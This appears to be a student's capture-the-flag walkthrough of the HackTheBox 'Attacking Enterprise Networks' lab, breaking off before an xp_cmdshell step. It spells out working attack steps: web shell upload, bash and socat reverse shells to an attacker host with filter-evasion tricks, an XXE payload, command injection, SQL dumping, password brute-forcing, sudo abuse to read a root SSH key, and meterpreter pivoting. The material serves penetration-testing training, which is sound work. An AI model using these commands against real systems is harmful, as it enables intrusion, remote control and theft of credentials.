---
title: Attacking Enterprise Networks
date: 2025-03-14 00:00:01 +0800
categories: [HTBAcademy]
tags: [CPTS]
---
Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It combines all of the concepts from previous modules and best emulates the 10-day black-box penetration test expected to be taken as an exam after completing said modules. It is best advised to attack this module blind as preparation for the exam. 

### First Flag:

The first flag was found using the following command:

```sh
dig axfr inlanefreight.local @10.129.229.147
```

Output:
```
; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> axfr inlanefreight.local @10.129.229.147
;; global options: +cmd
inlanefreight.local. 86400 IN SOA ns1.inlanfreight.local. dnsadmin.inlanfreight.local. 21 604800 86400 2419200 86400
inlanefreight.local. 86400 IN NS inlanefreight.local.
inlanefreight.local. 86400 IN A 127.0.0.1
blog.inlanefreight.local. 86400 IN A 127.0.0.1
careers.inlanefreight.local. 86400 IN A 127.0.0.1
dev.inlanefreight.local. 86400 IN A 127.0.0.1
flag.inlanefreight.local. 86400 IN TXT "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN A 127.0.0.1
ir.inlanefreight.local. 86400 IN A 127.0.0.1
status.inlanefreight.local. 86400 IN A 127.0.0.1
support.inlanefreight.local. 86400 IN A 127.0.0.1
tracking.inlanefreight.local. 86400 IN A 127.0.0.1
vpn.inlanefreight.local. 86400 IN A 127.0.0.1
```

---

(note that the target ip address can change because the target machine will shut down after a period of time on HackTheBox and will need to be manually restarted, randomly changing the ip address)

There also may be some subdomains that are not included in the zone transfer. We then additionally fuzz for subdomains using ffuf:
```
ffuf -w SecLists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.229.147 -H 'Host:FUZZ.inlanefreight.local'
```
We additionally get monitoring.inlanefreight.local as a subdomain.

### Second Flag:

Found using an FTP anonymous login:

```sh
ftp anonymous@ip
get flag.txt
```

---

I fuzzed for parameters with ffuf, I got this as result from the following command:
```
ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://careers.inlanefreight.local:80/FUZZ?id=1 -fs (common size)
```
```
apply        [Status: 200, Size: 16408, Words: 5625, Lines: 265, Duration: 84ms]
login        [Status: 200, Size: 9459, Words: 2752, Lines: 187, Duration: 159ms]
profile      [Status: 200, Size: 10148, Words: 3146, Lines: 195, Duration: 159ms]
register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
```

### Third Flag:
Then I browsed all the parameters and eventually got to http://careers.inlanefreight.local:80/register?id=1 to register an account with arbitrary credentials which authenticated me to the web server. I then was able view other profiles on http://careers.inlanefreight.local:80/profile?id=4 by adjusting the id parameter
which got me the third flag: HTB{8f40ecf17f681612246fa5728c159e46}

### Fourth Flag:
Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original GET request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to declare myself as an authorized ip address, which successfully got me onto the login.php website. 

Then, I see a file upload button and tried uploading a PHP web shell. It did not work since the uploader only allowed img/png files. I uploaded a test png file and recorded the HTTP POST request on BurpSuite. I changed the JPG code to the php web shell code, and then sent it again on BurpSuite to the site. This is successful and gave me a response saying that file was uploaded to /uploads/screenshot.png:
![[Pasted image 20250314195405.png]]

I tried to execute commands with the png file through executing the command on the url: http://dev.inlanefreight.local/uploads/screenshot.png?cmd=id , however it does not work since screenshot.png is a png file so it will not execute as a php file. I then changed the file extension on BurpSuite to screenshot.php and then uploaded the file using the POST request above. This works, and I was able to get remote code execution with http://dev.inlanefreight.local/uploads/screenshot.php?cmd=id

Then I checked the entire directory for a flag.txt using a find command, but since this is a web shell, I will have to url encode the command:
find / -type f -name "*flag.txt*" 2>/dev/null becomes find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull.

After typing the command on the web browser as 

http://dev.inlanefreight.local/uploads/screenshot.php?cmd=find%20%2F%20-type%20f%20-name%20%22%2Aflag.txt%2A%22%202%3E%2Fdev%2Fnull,

I get a flag.txt file at the directory /var/www/html/flag.txt. 

Using another url encoded command cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt,

we get HTB{57c7f6d939eeda90aa1488b15617b9fa} as the 4th flag.

### Fifth Flag:

Since we now have remote code execution through the web shell, we will attempt to upgrade the web shell to a fully interactive shell. 

I tried a variety of reverse shell one liners to connect to my local netcat listener and got this bash one liner shell to work: bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'

I URL-encoded the bash one liner and entered it on the url with my netcat listener active and got a working bash shell. I tried to escalate the shell to a fully interactive shell but was unsuccessful so I went ahead and looked at the other subdomains.

I went to ir.inlanefreight.local and I see that it is a wordpress site. I installed wpscan from the github repository and ran it against the url with 
wpscan --url http://ir.inlanefreight.local -e u --no-banner --api-token (api token from wpscan.com)

Got an interesting user called ilfreightwp from the above scan. I ran a bruteforce password attack using wpscan with 
wpscan --url http://ir.inlanefreight.local -P SecLists/Passwords/darkweb2017-top100.txt -U ilfreightwp --no-banner -t 500

and I got the password password1 for the user ilfreightwp. 

Logging into WordPress, we try the theme editor attack where we inject a php reverse shell one liner using bash with <?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>

and then inserting it into one of the themes php files. We then start our netcat listener and activate the theme to receive the bash shell. After using a find command, we find the 5th flag in the /var/www/html directory: HTB{e7134abea7438e937b87608eab0d979c}

### Sixth Flag:

Next we move onto status.inlanefreight.local. I see that there is a text box on the website so I attempted a sql injection with ' OR 1=1 --. It did not seem to work but it did throw a SQL error message on BurpSuite repeater. I saved the HTTP request as a file and then input it into sqlmap with the command "sqlmap -r sqlmap1 --batch --dump --level 5 --risk 3" with sqlmap1 as the HTTP request file. 

The command gives us this table:
```
| id | password                          | username |
+----+-----------------------------------+----------+
| 1  | 4528342e54d6f8f8cf15bf6e3c31bf1f6 | Admin    |
| 2  | 1fbea4df249ac4f4881a5da387eb297cf | Flag     |
+----+-----------------------------------+----------+
```

and we get the 6th flag: 1fbea4df249ac4f4881a5da387eb297cf

### Seventh Flag:
For tracking.inlanefreight.local, we try to list out potential filesystems with a javascript command using XMLHttpRequest():
```
<script>
    var files = ["/etc/", "C:/Windows/", "C:/Users/", "/home/", "/var/www/"];
    files.forEach(function(path) {
        var x = new XMLHttpRequest();
        x.onload = function() { document.write(path + " exists<br>"); };
        x.onerror = function() { document.write(path + " not accessible<br>"); };
        x.open("GET", "file:///" + path, true);
        x.send();
    });
</script>
```

When we paste this command into the text prompt, we get the output "/etc/ not accessible". Since we see that XMLHttpRequest gets us a response, we can create a request that tries to read a flag.txt from the filesystem if it exists:

```
<script>
    x = new XMLHttpRequest;
    x.onload = function() { document.write(this.responseText); };
    x.open("GET", "file:///flag.txt");
    x.send();
</script>
```

This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}

### Eighth Flag:

Next target will be gitlab.inlanefreight.local.

We see that it brings us to a gitlab page where it prompts us to login/register. We can register a test account and login. We don't see anything interesting at first, but with some browsing we see that if we go to Menu -> Groups -> Explore Groups, we come across a GitLab instance with the 8th flag: HTB{32596e8376077c3ef8d5cf52f15279ba}

### Ninth Flag:

We also have access to a website repository called shopdev2.inlanefreight.local. Upon visiting we see fields for admin username and password. Surprisingly, it has the default credentials username "admin" and password "admin." When visiting "my cart" at the url shopdev2.inlanefreight.local/cart.php, we see that there is backend processing since we get an HTTP response back from BurpSuite after we press complete purchase:
```
POST /checkout.php HTTP/1.1
Host: shopdev2.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 102
Origin: http://shopdev2.inlanefreight.local
Connection: keep-alive
Referer: http://shopdev2.inlanefreight.local/cart.php
Cookie: PHPSESSID=l6fdrpcqpv9rru1akat4ddicj6
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<root>
<subtotal>
	undefined
</subtotal>
<userid>
	1206
</userid>
</root>
```
Since the website accepts XML input, we can try an XXE injection by inserting a DOCTYPE tag nested with an ENTITY tag looks in the filesystem for a flag.txt using SYSTEM level privileges. Since we get XML output from the variable userid, we can attempt to insert a Document Type Definition using DOCTYPE, where we can define an arbitrary ENTITY, in this case "xxetest" which calls a system level command "file:////flag.txt." If we insert the entity in the field of userid, if the website has outdated XML libraries or does not sanitize/filter XML input, the entity in userid will be output back to us in the form of the command output of "file:////flag.txt" which will give us the value of the flag.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
<!ENTITY xxetest SYSTEM "file:////flag.txt">
]>
<root>
<subtotal>
	undefined
</subtotal>
<userid>
	&xxetest;
</userid>
</root>
```
After sending this altered code in repeater, we successfully get the 9th flag as shown below:
```
<!HTTP/1.1 200 OK
Date: Sat, 22 Mar 2025 02:32:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 81
Content-Type: text/html; charset=UTF-8
Via: 1.1 shopdev2.inlanefreight.local
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

User: HTB{dbca4dc5d99cdb3311404ea74921553c}
 <br>Checkout Process not Implemented
 ```
### Tenth Flag:
We then move on to the next subdomain monitoring.inlanefreight.local. The page appears to be a simple username and password portal with the login button. One look at BurpSuite and we see that the website returns the variables username= and password=. We can try using hydra to brute force this login form's admin account with the command: 
```
hydra -L SecLists/Usernames/Names/names.txt -P SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=^USER^&password=^PASS^:F=Invalid Credentials"
```
We then get admin as the username and 12qwaszx as the password after around 15 minutes. 

Once we login, we see that it takes us to a limited linux GUI. With the help command, we are able to see all the commands we can run. We notice that there is a command called "connection-test" which throws a "success" after you run it. We try to capture this processing through BurpSuite. 
```
GET /ping.php?ip=127.0.0.1 HTTP/1.1
Host: monitoring.inlanefreight.local
```
From here we see that it calls the ping.php file with the parameter ip which most likely pings the ip. Let's try to add an AND statement with urlencoded characters like &&,;, and the newline character. The newline character works if we substitute the HTTP header with 
```
GET /ping.php?ip=127.0.0.1%0als HTTP/1.1
Host: monitoring.inlanefreight.local
```

If we replace the original GET request with above, we get the following result in Burp repeater:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.038/0.038/0.038/0.000 ms
00112233_flag.txt
css
img
index.php
js
login.php
ping.php
```

Now I try to cat the flag.txt file, however it is giving me invalid command. I assume that the space characters are being filtered on the backend, so we try %09 tab character as an alternative. It works, and we get the 10th flag: 
HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}

### Eleventh Flag:

Since we have command execution, we can try using a reverse shell. I tried the following url encoded command on BurpSuite:
```
127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A%2Fb'i'n%2Fbash
```
This did not seem to work. I tested similar commands a couple of times and realized that the backend may be blocking %2F or the "/" command to prevent calling on directories. I instead used the obfuscation method "${PATH:0:1}" which is equivalent to "/".

Now the command becomes
```
127.0.0.1%0a's'o'c'a't'%09TCP%3A10.10.16.41%3A4443%09EXEC%3A${PATH:0:1}b'i'n${PATH:0:1}bash
```
and we successfully get a basic reverse shell connection on our attack box. 

Now we try to upgrade our socat shell to a fully interactive shell. We do this by using another netcat listener on the terminal with the command
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.41:4442
```
After we get the fully interactive reverse shell, we see that we are the "webdev" user on a machine called "dmz01." We cycle through the user profiles in the /home directory and get our 11th flag from the "srvadm" user's home directory:
```
b447c27a00e3a348881b0030177000cd
```
### Twelveth Flag:

For the twelveth flag, unfortunately I had to refer to the Attacking Enterprise Networks module as I was not able to make any ground myself. From the module, we learn that if we have control over an adm user, in this case we have webdev which is close enough, we can use aureport to read audit logs which may have saved the command line history in plaintext. 
```
aureport --tty | less
```
From this command, we see "ILFreightnixadm!" as the password for the srvadm account. We then switch to the srvadm account and try to find the flag:
```
find / -type f -iname "*flag*" 2>/dev/null
```
and we see the directory /srv/ftp/flag.txt and get the 12th flag: HTB{0eb0ab788df18c3115ac43b1c06ae6c4}

### Thirteenth Flag:

There is probably a flag in /root but unfortunately I can't cd to /root as the srvadm. I check my sudo -l privileges and see the following:
```
User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```
Since we have sudo command on /usr/bin/openssl, we will check GTFOBINS for an exploit. There is a sudo exploit on GTFOBINS, but it did not work in getting me root access. I used the below command to display the id_rsa file in the root folder using openssl with root privilege.
```
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
```
The first declares the LFILE variable as the ssh private key id_rsa under the root directory. 
The second exploits the openssl sudo privilege to encrypt the ssh private key with "-in $LFILE" to use the file path specified by the environment variable $LFILE. 
```
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa
```
Not sure if it is necessary to call the LFILE variable, as the command above also works in retrieving the private key. Now we can use the SSH private key to authenticate as root:
```
ssh -i id_rsa root@(ip)
```
Now we can browse to the /root directory and concatenate the Thirteenth flag:
```
a34985b5976072c3c148abc751671302
```
### Fourteenth Flag:
Since we have root access on the machine, we can now focus in pivoting to other networks. 
We do netstat -r and notice that we are on three subnets: 10.129.0.0/16, 172.16.0.0/16, 172.17.0.0/16, and 172.18.0.0/16. We use msfvenom to generate a .elf reverse shell script for DMZ01 using the following command:
```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(localip) LPORT=(localport) -f elf > shell.elf
```
We then use scp to transfer this shell.elf file to DMZ01:
```
sudo scp -i id_rsa shell.elf root@(ip)
```
After that's done, we go into msfconsole and use multi/handler to set up a reverse shell listener. 
```
USE multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST (ip)
set LPORT (port)
run
```
Then run ./shell.elf as root on DMZ01 to get the reverse shell.

Once that's done, background the meterpreter session you get on msfconsole and then use post/multi/manage/autoroute, set session and subnet, and run. 
```
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
```
You can then check routes with the "route" command on msfconsole.

Next we setup proxychains for firewall evasion:
```
sudo apt-install proxychains
vim /etc/proxychains.conf
socks4  127.0.0.1 9050
```
Then use dynamic port forwarding to ssh to DMZ01 to utilize the proxychains servers.
```
ssh -D 9050 -i id_rsa root@(ip)
```
We can also test if proxychains is working by testing a proxychains nmap scan, be careful because proxychain nmap scans may only work with the subcommands -Pn to prevent pinging the target as officially proxychains does not support ICMP, only TCP, and -sT for TCP connect scanning. 
```
proxychains nmap -sT -Pn (ip)
```
After verifying proxychains is working, we create a new shell.elf file but this time making the local port 9050, which is the port for the proxychains servers. We then use multi/handler to create a TCP listener on msfconsole and execute the shell.elf file on DMZ1. After getting meterpreter, we background the session and use multi/gather/ping_sweep and use the subnet 172.16.0.0/16 172.17.0.0/16 172.18.0.0/16 as the RHOSTS as well as set the meterpreter session number. 
We then run the ping sweep and wait a while for it to return hosts:
```
[*] Performing ping sweep for IP range 172.16.0.0/16
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found

[*] Performing ping sweep for IP range 172.17.0.0/16
[+] 	172.17.0.2 host found
[+] 	172.17.0.1 host found

[*] Performing ping sweep for IP range 172.18.0.0/16
[+] 	172.18.0.3 host found
[+] 	172.18.0.8 host found
[+] 	172.18.0.7 host found
[+] 	172.18.0.6 host found
[+] 	172.18.0.5 host found
[+] 	172.18.0.2 host found
[+] 	172.18.0.9 host found
[+] 	172.18.0.4 host found
[+] 	172.18.0.1 host found
[+] 	172.18.0.10 host found
[+] 	172.18.0.11 host found
[+] 	172.18.0.12 host found

[*] Performing ping sweep for IP range 10.129.0.0/16
[+] 	10.129.0.1 host found
[+] 	10.129.1.43 host found
[+] 	10.129.1.168 host found
[+] 	10.129.2.47 host found
[+] 	10.129.2.48 host found
[+] 	10.129.2.80 host found
[+] 	10.129.2.219 host found
[+] 	10.129.3.171 host found

```
After finding all these hosts, we create a text file containing all of these ip addresses and then use the nmap command with -iL to enumerate all of these hosts.
```
sudo proxychains nmap -sT -Pn -iL nmaphosts.txt (ip)
```
I then upload the static nmap binary and the list of hosts text file to DMZ01 and then nmap scan on DMZ01. 
```
./nmap --open -iL live_hosts 

SYN Stealth Scan Timing: About 100.00% done; ETC: 19:48 (0:00:00 remaining)
Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00046s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B0:0D:49 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B0:51:4C (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00055s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B0:48:B7 (Unknown)
```
We see that 172.16.8.3 is most likely the domain controller because we see Kerberos and LDAP as open ports. 
For 172.16.8.20, we are interested in the HTTP service port 80 as well as the NFS service on port 2049.
For 172.16.8.50, we are interested in the HTTP service on port 8080.

We use the following commands to attempt to mount the NFS share from 172.16.8.20:
```
mkdir target-NFS
sudo mount -t NFS (ip):/ ./target-NFS -o nolock
cd target-NFS
```
Then we see the DEV01 share that has a flag.txt file and finally we find the Fourteenth Flag: bf22a1d0acfca4af517e1417a80e92d1.

### Fifteenth Flag:
In the DNN Directory of DEV01 share, we also see cleartext administrator credentials in the web.config file:
```
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
```
From web.deploy.config, we also see a potential SQL database called "MyDB"

We now try to get on the website of 172.16.8.20. We use:
```
proxychains firefox 172.16.8.20
```
However it does not seem to load. The problem was probably that SOCKS4 proxychains was not supported, so we change to the newer SOCKS5 which has UDP and authentication support by changing socks4 to socks5 in proxychains.conf. 
We then rerun the above command. We also change the browser network settings for firefox to manual proxy with the loopback address and port set for SOCK5. 

We then try to get to the login page of 172.16.8.20 since we have administrator credentials to test. It seems very slow to load.
We enter the credentials below and then 
```
Administrator
D0tn31Nuk3R0ck$$@123
```
The site loads super slowly and eventually times me out. I see that on the root host, I was getting a lot of channel open failed, so I see that SSH port forwarding is not working well. I then decide to try using Chisel HTTP tunneling instead of pure SSH port forwarding. I downloaded the Chisel binary from GitHub, scp'd it to the root user's directory on DMZ01, and set up a SOCKS5 tunnel with Chisel using DMZ01 as the Chisel server and my attack box as the Chisel client using the similar commands as below:
```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

TheControlDevil@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```
We also make sure that we have socks5 127.0.0.1 1080 in our /etc/proxychains.conf file since 1080 is the default proxychains port that will connect to the Chisel tunnel. After this, we do proxychains firefox 172.16.8.20 again and see that we have no lag connecting to the website and entering in our credentials after upgrading our pure SSH tunnel to a Chisel tunnel. 

First thing that was interesting to me was the SQL console. We try to inject the following commands to get a xp_commandshell:
```

